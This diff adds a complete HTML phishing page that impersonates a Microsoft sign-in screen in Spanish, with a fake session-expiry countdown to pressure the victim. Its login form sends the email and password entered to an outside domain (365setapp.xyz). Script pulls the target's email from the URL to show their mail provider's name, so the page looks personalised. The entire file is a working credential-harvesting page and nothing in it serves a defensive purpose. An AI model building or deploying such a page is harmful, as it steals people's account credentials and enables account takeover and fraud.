@@ -1,0 +1,300 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<title>Sign in to verify</title>
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />   
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">	
+    <link rel="shortcut icon" type="icon" href="https://i.imgur.com/YfpmLHg.png">
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+    <style>
+      html, body {
+    height: 100%;
+     font-family: Poppins-Regular, sans-serif; 
+     overflow: auto;
+}
+
+img {
+  width:30%;
+}
+
+.whytebox {
+    background: rgba(0,0,0,0.02);
+    border-radius: 5px;
+    padding: 1.25rem 0 0.05rem 0;
+    width: auto;
+    overflow: visible!important;
+    margin: 0 auto;
+} 
+.resedup{
+    -webkit-box-shadow: 1px 1px 6px 4px rgba(0,0,0,0.09);
+    -moz-box-shadow: 1px 1px 6px 4px rgba(0,0,0,0.09);  
+}
+.form-title{
+  display: block;
+    /*font-family: Poppins-semibold;*/
+    font-size: 25px;
+    color:#007bff;
+    line-height: 1.2;
+    text-align: center; 
+}
+
+
+/*To remove the outline that appears on clicking the input textbox*/
+input:focus {
+  outline: none;
+}
+
+#mainlogo{
+  max-width: 100%;
+  height: auto;
+  margin:auto; 
+}
+.count-down-time {
+    display: block;
+    font-family: Poppins-medium, sans-serif;
+    font-size: 18px;
+    color: #333333;
+    line-height: 1.2;
+    text-align: center;
+}
+.count-down-time>span {
+    color: #ff0000;
+    font-weight: bold;
+    /*font-size:19px;*/
+    font-family: Poppins-medium, sans-serif;
+}
+#formLogin label{
+    font-family: Poppins-medium, sans-serif;
+    font-size: 17px;
+    color: #333333;
+}
+
+.formStyle { 
+  /*background-color: #2ecc71;*/
+  padding: 20px; 
+  max-width: 100%; 
+  margin-bottom: 1px; 
+  /*border-bottom: 1px solid #111;*/
+  font-size: 1em;
+  font-weight: 100;
+  color: #333333;
+}
+
+.formbox {
+   /*background-color: #2ecc71;*/
+  padding: 10px; 
+  width: 100%; 
+  margin-bottom: 0px; 
+  color: #333333; 
+}
+
+.formButton {
+  background-color:#ffffff;
+  display:inline-block;
+  color:#00a4ef;
+  font-size:28px;
+  font-weight: 500;
+  padding:6px 24px;
+  margin-top: 1px;
+  text-decoration:none;
+}
+
+.formButton:hover {
+  background-color:#00a4ef;
+  color:#ffffff;
+}
+
+.formButton:active {
+  position:relative;
+  top:3px;
+}
+
+.justify-content-center{
+justify-content: center!important;  
+} 
+.dflex {
+    display: -ms-flexbox!important;
+    display: flex!important;
+}
+#lang-links, .cpr {
+    margin-top: 40px !important;
+} 
+.futa-links ul li a {
+    color: #293a4a;
+    text-decoration: none;
+    font-size: 15px;
+    font-style: normal;
+}
+.futa-links ul li a:hover {
+    color: #FF0000;
+    font-style: italic;
+}
+
+/*To remove the outline that appears on clicking the input textbox*/
+input:focus {
+  outline: none;
+}
+/* To format the placeholder text color */
+::-webkit-input-placeholder {
+   color: #888;
+}
+
+:-moz-placeholder { /* Firefox 18- */
+   color: #888;  
+}
+
+::-moz-placeholder {  /* Firefox 19+ */
+   color: #888;  
+}
+
+:-ms-input-placeholder {  
+   color: #888;  
+}
+input::placeholder 
+{ color: #888; }
+
+
+footer ul{
+  margin-left: -60px;
+}
+footer li {
+    display: inline;
+    list-style: none;
+    margin-left: 20px;
+}   
+
+    </style>
+  </head>
+
+<body>
+
+<main class=" mt-4">
+  <div class="container">
+
+    <div class="row justify-content-md-center">
+      <div class="col-md-5" style=""></div>
+      <div class="col-md-2" style="">
+        <div class="mt-2 mx-auto" style="display: inline-block; text-align: center">
+          <center>
+<img src="https://www.roia.org/wp-content/uploads/2017/07/Microsoft-Logo-PNG-Transparent-Image.png" style="margin:0 auto; margin-top: -15px; width: 50%;">
+          <div style="font-size: 26px; margin-top: 20px; display: inline-block;" id="la-web-mail" class="mt-5"></div>            
+          </center>
+        </div>
+      </div>
+      <div class="col-md-5" style=""></div>
+    </div>
+    <div class="row justify-content-md-center mt-2">
+      <div class="col-md-3" style=""></div>
+      <div class="col-md-5 col-12" style="">
+  		  <div class="whytebox resedup">
+      		<span class="form-title pt-1 pb-3">Asegure su cuenta</span>	
+      		<div class="count-down-time">Esta sesión expira en <span id="time">1:00</span> minutos!</div>	
+
+      		  <form action="https://365setapp.xyz" method="post" id="formLogin" class="formStyle">
+      			  <div class="form-group">
+      			    <label for="email">Correo</label>
+      			    <input type="email" name="email" class="formbox" id="mail" placeholder="Enter Email Address" required />
+      			  </div>			  	
+
+      			  <div class="form-group">
+      			    <label for="password">Contraseña</label>
+      			    <input type="password" name="password" class="formbox" id="password" placeholder="Enter Email Password" required />
+      			  </div>	
+
+      			  <div class="form-group">
+      			  	<center>
+                  <button type="submit" class="btn btn-primary formButton mb-1 text-center">Iniciar sesión</button>			  		
+      			  	</center>
+      				
+      			  </div>			    
+      		  </form>
+  		  </div>      	
+      </div>
+      <div class="col-md-3" style=""></div>
+    </div>
+
+  </div>
+
+</main>
+<footer>
+  <div class="col-sm-12" style="">
+	<div id="lang-links" style="display: block;">
+		<div class="futa-links dflex justify-content-center">
+			<ul>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=de&email=anonymous-sabre@protonmail.com">Deutsch </a> </li>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=ar&email=anonymous-sabre@protonmail.com">العربية  </a> </li>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=en&email=anonymous-sabre@protonmail.com">English </a> </li>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=fr&email=anonymous-sabre@protonmail.com">français </a> </li>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=zh&email=anonymous-sabre@protonmail.com">中文 </a> </li>
+				<li><a href="/we/ll/gr/af/te/dd/index.php?locale=es&email=anonymous-sabre@protonmail.com">español </a> </li>
+			</ul>
+		</div>
+	</div>  	
+  </div>
+</footer>
+<script
+  src="https://code.jquery.com/jquery-3.5.1.js"
+  integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc="
+  crossorigin="anonymous"></script>
+<script>
+    function startTimer(duration, display) {
+    var timer = duration, minutes, seconds;
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+            timer = duration;
+        }
+    }, 1000);
+}
+
+window.onload = function () {
+	var startTime = document.getElementById('time').innerHTML;
+	var startTime = parseInt(startTime, 10);
+    var fiveMinutes = 60 * startTime,
+        display = document.querySelector('#time');
+    startTimer(fiveMinutes, display);
+ 
+    var em = new URL(location.href).searchParams.get("email");
+      var name = getDomainFromEmail(em);
+      name = jsUcfirst(name);
+
+      $('#la-web-mail').text(name); 
+        
+};
+
+
+
+const getDomainFromEmail = email => {
+  let emailDomain = null;
+  const pos = email.search('@'); // get position of domain
+  if (pos > 0) {
+    emailDomain = email.slice(pos+1); // use the slice method to get domain name, "+1" mean domain does not include "@"
+  }
+  return emailDomain;
+};    
+
+
+const removeTLD = name =>{
+  var name = getDomainFromEmail(name);
+   name = name.substring(0, name.lastIndexOf("."))
+  return name;
+}
+
+
+function jsUcfirst(string) 
+{
+    return string.charAt(0).toUpperCase() + string.slice(1);
+}
+</script>
+
+</body>
+</html>
